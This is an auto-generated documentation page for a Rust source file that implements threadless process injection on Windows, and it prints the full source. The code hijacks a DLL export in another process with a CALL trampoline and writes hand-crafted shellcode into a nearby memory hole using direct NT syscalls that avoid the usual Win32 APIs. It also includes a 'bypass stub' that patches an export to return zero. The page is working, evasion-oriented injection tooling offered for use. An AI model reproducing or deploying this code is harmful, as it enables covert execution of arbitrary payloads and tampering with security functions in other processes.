# crowd — threadless.rs  (🔥 S TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/threadless.rs` |
| **Lines** | 389 |
| **Tier** | S |
| **Cards** | T007-process-injection |
| **Role** | Threadless injection |
| **Unsafe blocks** | 7 |

## Purpose

# crowd — threadless.rs  (🔥 S TIER)

Threadless injection via export hijacking + self-restoring trampoline.
Full implementation verbatim from
killaofking/crates/core/src/experimental/injection/threadless.rs.

## Constants

- `TH32CS_SNAPMODULE`: `u32` = `0x0000_0008`
- `TH32CS_SNAPMODULE32`: `u32` = `0x0000_0010`
- `CLEAN_STUB`: `[u8; 3]` = `[0x31, 0xC0, 0xC3]`

## Types

### struct `ModuleEntry32W` (line 55)

## Public API

### `try_threadless_inject` `unsafe` (line 143)
```rust
pub unsafe fn try_threadless_inject(
```

### `install_clean_stub` `unsafe` (line 386)
```rust
pub unsafe fn install_clean_stub(h_process: HANDLE, target_dll: &str, target_export: &str) -> bool
```
Bypass stub: xor eax,eax; ret — routes through threadless mechanism.

## Internal Functions

- `utf16z_to_string` (line 72)
- `remote_module_base` (unsafe) (line 77)
- `free_hole_syscall` (unsafe) — Helper: free a memory hole via NtFreeVirtualMemory syscall (line 271)
- `find_memory_hole` (line 282)
- `resolve_suspend_resume` (unsafe) (line 311)
- `install_trampoline` (line 321)

## Key Dependencies

- `use windows::core::PCSTR;`
- `use windows::Win32::Foundation::{HANDLE, HMODULE, INVALID_HANDLE_VALUE};`
- `use windows::Win32::System::Threading::{GetCurrentProcess, GetProcessId};`
- `use windows::Win32::System::{`
- `use winapi::shared::minwindef::BOOL;`

## Full Source

```rust
//! # crowd — threadless.rs  (🔥 S TIER)
//!
//! Threadless injection via export hijacking + self-restoring trampoline.
//! Full implementation verbatim from
//! killaofking/crates/core/src/experimental/injection/threadless.rs.

#![allow(dead_code)]

use std::ffi::{c_void, CString};
use std::mem::size_of;
use std::path::Path;
use windows::core::PCSTR;
use windows::Win32::Foundation::{HANDLE, HMODULE, INVALID_HANDLE_VALUE};
use windows::Win32::System::Threading::{GetCurrentProcess, GetProcessId};
use windows::Win32::System::{
    LibraryLoader::{GetProcAddress, LoadLibraryA},
    Memory::PAGE_PROTECTION_FLAGS,  // only used by legacy type refs
};
use winapi::shared::minwindef::BOOL;

// Expanded PATCH_SHELLCODE with XMM preservation (~121 bytes).
// Opcodes manually crafted to include XMM0-XMM5 preservation.
// Verbatim from threadless.rs in killaofking.
pub static mut PATCH_SHELLCODE: [u8; 121] = [
    0x58,                                     // POP RAX
    0x48, 0x83, 0xE8, 0x05,                   // SUB RAX, 5
    0x50,                                     // PUSH RAX
    0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, // PUSH regs
    0x48, 0xB9,
    0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // MOV RCX, [original bytes] offset 18
    0x48, 0x89, 0x08,                         // MOV [RAX], RCX
    0x48, 0x81, 0xEC, 0xA8, 0x00, 0x00, 0x00, // SUB RSP, 0xA8
    0x0F, 0x29, 0x44, 0x24, 0x40,            // MOVAPS [RSP+0x40], XMM0
    0x0F, 0x29, 0x4C, 0x24, 0x50,            // MOVAPS [RSP+0x50], XMM1
    0x0F, 0x29, 0x54, 0x24, 0x60,            // MOVAPS [RSP+0x60], XMM2
    0x0F, 0x29, 0x5C, 0x24, 0x70,            // MOVAPS [RSP+0x70], XMM3
    0x0F, 0x29, 0x64, 0x24, 0x80,            // MOVAPS [RSP+0x80], XMM4
    0x0F, 0x29, 0x6C, 0x24, 0x90,            // MOVAPS [RSP+0x90], XMM5
    0xE8, 0x11, 0x00, 0x00, 0x00,            // CALL +0x11 (shellcode follows)
    0x0F, 0x28, 0x6C, 0x24, 0x90,            // MOVAPS XMM5, [RSP+0x90]
    0x0F, 0x28, 0x64, 0x24, 0x80,            // MOVAPS XMM4, [RSP+0x80]
    0x0F, 0x28, 0x5C, 0x24, 0x70,            // MOVAPS XMM3, [RSP+0x70]
    0x0F, 0x28, 0x54, 0x24, 0x60,            // MOVAPS XMM2, [RSP+0x60]
    0x0F, 0x28, 0x4C, 0x24, 0x50,            // MOVAPS XMM1, [RSP+0x50]
    0x0F, 0x28, 0x44, 0x24, 0x40,            // MOVAPS XMM0, [RSP+0x40]
    0x48, 0x81, 0xC4, 0xA8, 0x00, 0x00, 0x00, // ADD RSP, 0xA8
    0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, // POP regs
    0xFF, 0xE0,                               // JMP RAX
];

const TH32CS_SNAPMODULE: u32 = 0x0000_0008;
const TH32CS_SNAPMODULE32: u32 = 0x0000_0010;

#[repr(C)]
struct ModuleEntry32W {
    dw_size: u32,
    th32_module_id: u32,
    th32_process_id: u32,
    glblcnt_usage: u32,
    proccnt_usage: u32,
    mod_base_addr: *mut u8,
    mod_base_size: u32,
    h_module: HMODULE,
    sz_module: [u16; 256],
    sz_exe_path: [u16; 260],
}

type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> HANDLE;
type Module32FirstWFn = unsafe extern "system" fn(HANDLE, *mut ModuleEntry32W) -> BOOL;
type Module32NextWFn  = unsafe extern "system" fn(HANDLE, *mut ModuleEntry32W) -> BOOL;

fn utf16z_to_string(buf: &[u16]) -> String {
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..end])
}

unsafe fn remote_module_base(h_process: HANDLE, target_dll: &str) -> Option<*mut c_void> {
    let kernel32 = LoadLibraryA(PCSTR(c"kernel32.dll".as_ptr() as *const u8)).ok()?;
    let create_snapshot = GetProcAddress(
        kernel32,
        PCSTR(c"CreateToolhelp32Snapshot".as_ptr() as *const u8),
    )
    .map(|p| std::mem::transmute::<_, CreateToolhelp32SnapshotFn>(p))?;
    let module32_first = GetProcAddress(
        kernel32,
        PCSTR(c"Module32FirstW".as_ptr() as *const u8),
    )
    .map(|p| std::mem::transmute::<_, Module32FirstWFn>(p))?;
    let module32_next = GetProcAddress(
        kernel32,
        PCSTR(c"Module32NextW".as_ptr() as *const u8),
    )
    .map(|p| std::mem::transmute::<_, Module32NextWFn>(p))?;

    let pid = GetProcessId(h_process);
    if pid == 0 {
        return None;
    }
    let snapshot = create_snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if snapshot == INVALID_HANDLE_VALUE {
        return None;
    }
    let target_name = Path::new(target_dll)
        .file_name()
        .map(|n| n.to_string_lossy().to_ascii_lowercase())?;

    let mut entry = ModuleEntry32W {
        dw_size: size_of::<ModuleEntry32W>() as u32,
        th32_module_id: 0,
        th32_process_id: 0,
        glblcnt_usage: 0,
        proccnt_usage: 0,
        mod_base_addr: std::ptr::null_mut(),
        mod_base_size: 0,
        h_module: HMODULE(std::ptr::null_mut()),
        sz_module: [0; 256],
        sz_exe_path: [0; 260],
    };
    let mut module_base = None;
    if module32_first(snapshot, &mut entry) != 0 {
        loop {
            let module_name = utf16z_to_string(&entry.sz_module).to_ascii_lowercase();
            let module_path = utf16z_to_string(&entry.sz_exe_path).to_ascii_lowercase();
            if module_name == target_name
                || Path::new(&module_path)
                    .file_name()
                    .map(|n| n.to_string_lossy().to_ascii_lowercase() == target_name)
                    .unwrap_or(false)
            {
                module_base = Some(entry.mod_base_addr as *mut c_void);
                break;
            }
            entry.dw_size = size_of::<ModuleEntry32W>() as u32;
            if module32_next(snapshot, &mut entry) == 0 {
                break;
            }
        }
    }
    let _ = windows::Win32::Foundation::CloseHandle(snapshot);
    module_base
}

pub unsafe fn try_threadless_inject(
    h_process: HANDLE,
    target_dll: &str,
    target_export: &str,
    shellcode: &[u8],
) -> bool {
    // Keep CStrings alive to prevent use-after-free on .as_ptr()
    let dll_cstr = CString::new(target_dll).unwrap();
    let h_module =
        LoadLibraryA(PCSTR(dll_cstr.as_ptr() as *const u8));
    if h_module.is_err() {
        return false;
    }
    let h_module = h_module.unwrap();
    let export_cstr = CString::new(target_export).unwrap();
    let address = GetProcAddress(
        h_module,
        PCSTR(export_cstr.as_ptr() as *const u8),
    );
    if address.is_none() {
        return false;
    }
    let func_rva = address.unwrap() as usize - h_module.0 as usize;
    let func_address = if h_process == GetCurrentProcess() {
        (h_module.0 as usize + func_rva) as *mut c_void
    } else {
        match remote_module_base(h_process, target_dll) {
            Some(base) => (base as usize + func_rva) as *mut c_void,
            None       => {
                // FALLBACK: If remote_module_base fails (e.g. suspended process PEB empty),
                // use local base for known system DLLs since ASLR maps them system-wide.
                let l_name = target_dll.to_ascii_lowercase();
                if l_name == "ntdll.dll" || l_name == "kernel32.dll" || l_name == "kernelbase.dll" {
                    (h_module.0 as usize + func_rva) as *mut c_void
                } else {
                    return false;
                }
            }
        }
    };

    // ── RecycledGate syscall path ── (replaces Win32 VirtualAllocEx/WriteProcessMemory/etc.)
    let h_proc_raw = h_process.0 as usize;

    let mut original_bytes = [0u8; 8];
    let mut bytes_read: usize = 0;
    let current = GetCurrentProcess();
    if h_process != current {
        let status = crate::recycled::nt_read_virtual_memory(
            h_proc_raw,
            func_address,
            original_bytes.as_mut_ptr() as *mut c_void,
            original_bytes.len(),
            &mut bytes_read,
        );
        if status < 0 || bytes_read != original_bytes.len() {
            return false;
        }
    } else {
        std::ptr::copy_nonoverlapping(
            func_address as *const u8,
            original_bytes.as_mut_ptr(),
            original_bytes.len(),
        );
    }

    let mut patch = PATCH_SHELLCODE;
    patch[18..26].copy_from_slice(&original_bytes);

    let total_size = shellcode.len() + patch.len();
    let hole = find_memory_hole(h_process, func_address as usize, total_size);
    if hole.is_none() {
        return false;
    }
    let hole = hole.unwrap();
    let mut written: usize = 0;

    // Write patch trampoline via NtWriteVirtualMemory
    let status = crate::recycled::nt_write_virtual_memory(
        h_proc_raw,
        hole,
        patch.as_ptr() as *const c_void,
        patch.len(),
        &mut written,
    );
    if status < 0 {
        free_hole_syscall(h_proc_raw, hole);
        return false;
    }

    // Write shellcode right after patch
    let status = crate::recycled::nt_write_virtual_memory(
        h_proc_raw,
        (hole as *mut u8).add(patch.len()) as *mut c_void,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        &mut written,
    );
    if status < 0 {
        free_hole_syscall(h_proc_raw, hole);
        return false;
    }

    // Flip RW → RX via NtProtectVirtualMemory
    let mut base_protect = hole;
    let mut region_size = total_size;
    let mut old_protect: u32 = 0;
    let status = crate::recycled::nt_protect_virtual_memory(
        h_proc_raw,
        &mut base_protect,
        &mut region_size,
        0x20, // PAGE_EXECUTE_READ
        &mut old_protect,
    );
    if status < 0 {
        free_hole_syscall(h_proc_raw, hole);
        return false;
    }

    if install_trampoline(h_process, hole, func_address) {
        true
    } else {
        free_hole_syscall(h_proc_raw, hole);
        false
    }
}

/// Helper: free a memory hole via NtFreeVirtualMemory syscall
unsafe fn free_hole_syscall(h_proc: usize, hole: *mut c_void) {
    let mut base = hole;
    let mut size: usize = 0;
    let _ = crate::recycled::nt_free_virtual_memory(
        h_proc,
        &mut base,
        &mut size,
        0x00008000, // MEM_RELEASE
    );
}

fn find_memory_hole(h_process: HANDLE, func_address: usize, size: usize) -> Option<*mut c_void> {
    let h_proc_raw = h_process.0 as usize;
    let mut address = (func_address & 0xFFFFFFFFFFF70000).wrapping_sub(0x70000000);

    while address < func_address + 0x70000000 {
        let mut base = address as *mut c_void;
        let mut region_size = size;
        let status = unsafe {
            crate::recycled::nt_allocate_virtual_memory(
                h_proc_raw,
                &mut base,
                0,
                &mut region_size,
                0x00003000, // MEM_COMMIT | MEM_RESERVE
                0x04,       // PAGE_READWRITE
            )
        };
        if status >= 0 && !base.is_null() {
            return Some(base);
        }
        address = address.wrapping_add(0x10000);
    }
    None
}

/// Resolve NtSuspendProcess / NtResumeProcess from ntdll at runtime.
type NtSuspendProcessFn = unsafe extern "system" fn(usize) -> i32;
type NtResumeProcessFn  = unsafe extern "system" fn(usize) -> i32;

unsafe fn resolve_suspend_resume() -> Option<(NtSuspendProcessFn, NtResumeProcessFn)> {
    let ntdll = LoadLibraryA(PCSTR(c"ntdll.dll".as_ptr() as *const u8)).ok()?;
    let suspend = GetProcAddress(ntdll, PCSTR(c"NtSuspendProcess".as_ptr() as *const u8))?;
    let resume  = GetProcAddress(ntdll, PCSTR(c"NtResumeProcess".as_ptr() as *const u8))?;
    Some((
        std::mem::transmute::<_, NtSuspendProcessFn>(suspend),
        std::mem::transmute::<_, NtResumeProcessFn>(resume),
    ))
}

fn install_trampoline(h_process: HANDLE, hole: *mut c_void, function_address: *mut c_void) -> bool {
    let h_proc_raw = h_process.0 as usize;

    unsafe {
        let mut trampoline = [0xE8, 0x00, 0x00, 0x00, 0x00];
        let rva = (hole as isize).wrapping_sub(function_address as isize + 5);
        if rva < i32::MIN as isize || rva > i32::MAX as isize {
            return false;
        }
        let rva_bytes = (rva as i32).to_ne_bytes();
        trampoline[1..5].copy_from_slice(&rva_bytes);

        // Flip target export to RW via NtProtectVirtualMemory
        let mut base_prot = function_address;
        let mut region_sz: usize = 5;
        let mut old_protect: u32 = 0;
        let status = crate::recycled::nt_protect_virtual_memory(
            h_proc_raw,
            &mut base_prot,
            &mut region_sz,
            0x04, // PAGE_READWRITE
            &mut old_protect,
        );
        if status < 0 {
            return false;
        }

        // Suspend all threads in target process before writing the 5-byte trampoline
        // to prevent partial-read races (non-atomic cross-cache-line CALL patch).
        let suspend_resume = resolve_suspend_resume();
        if let Some((nt_suspend, _)) = suspend_resume {
            let _ = nt_suspend(h_proc_raw);
        }

        // Write trampoline CALL via NtWriteVirtualMemory
        let mut written: usize = 0;
        let _ = crate::recycled::nt_write_virtual_memory(
            h_proc_raw,
            function_address,
            trampoline.as_ptr() as *const c_void,
            5,
            &mut written,
        );

        // Resume all threads after the atomic write is complete
        if let Some((_, nt_resume)) = suspend_resume {
            let _ = nt_resume(h_proc_raw);
        }

        // Restore original protection
        let mut base_rest = function_address;
        let mut region_rest: usize = 5;
        let _ = crate::recycled::nt_protect_virtual_memory(
            h_proc_raw,
            &mut base_rest,
            &mut region_rest,
            old_protect,
            &mut old_protect,
        );

        true
    }
}

/// Bypass stub: xor eax,eax; ret — routes through threadless mechanism.
pub unsafe fn install_clean_stub(h_process: HANDLE, target_dll: &str, target_export: &str) -> bool {
    const CLEAN_STUB: [u8; 3] = [0x31, 0xC0, 0xC3];
    try_threadless_inject(h_process, target_dll, target_export, &CLEAN_STUB)
}

```